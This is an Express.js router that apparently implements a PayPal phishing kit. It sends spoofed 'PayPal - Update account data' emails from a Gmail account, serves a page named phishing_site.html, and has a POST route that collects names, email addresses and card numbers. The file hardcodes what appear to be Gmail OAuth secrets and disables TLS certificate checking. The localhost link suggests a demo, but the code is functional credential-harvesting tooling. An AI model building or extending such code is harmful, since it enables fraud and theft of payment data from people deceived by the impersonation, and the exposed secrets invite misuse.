const express = require('express')
var router = express.Router()
var mailer = require('nodemailer');

router.get("/emailGenerator",(req,res)=>{

    res.render(__dirname+"/views/mail.html",{
    })

})

router.post("/sendMail",(req,res)=>{

  var email = req.body.email

  var transporter = mailer.createTransport({
      service: 'Gmail',
      port: 25,
      auth: {
        type: 'OAuth2',
        user: 'paypal.updatedata@gmail.com',
        pass: 'paypal99',
        clientId: '951237293848-h7i8872k2b88c0pukoakq4rgrhuk4p4e.apps.googleusercontent.com',
        clientSecret: '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',
        refreshToken: '1//048Ka7YIIg_XLCgYIARAAGAQSNwF-L9Ir2unKMLKsNvK4OHG0Z7-76xDbmZdoXUmR7wYfntLLBzjhN4JJReQ8uXkGOHgehsZIMxE'
      },
      tls: {
          rejectUnauthorized: false
      }
      
  })
  
  var email = req.body.email
  
  var mailOptions = {
      from: 'paypal.updatedata@gmail.com',
      to: email,
      subject: 'PayPal - Update account data',
      html: '<p>Refresh your PayPal account data by clicking <a href="http://localhost:2500/api/paypal">here</a> </p>'
  }
  
  transporter.sendMail(mailOptions, function(error, info){
          if (error) {
            console.log(error);
            res.json({"Error":"Error during e-mail sending"})
          } else {
            console.log('E-mail is successfully sent: ' + info.response);
            res.json({"Email":"E-mail is successfully sent!"})
          }
    })
})

router.get('/paypal',(req,res)=>{
  res.render(__dirname+"/views/phishing_site.html",{
  })
})

router.post('/updatedData',(req,res)=>{
  
  var firstName = req.body.firstName
  var lastName = req.body.lastName
  var email = req.body.email
  var cardNumber = req.body.cardNumber

  var jsonData = {"firstName":firstName, "lastName":lastName,"email":email,"cardNumber":cardNumber}
  res.json(jsonData)

})

module.exports = router
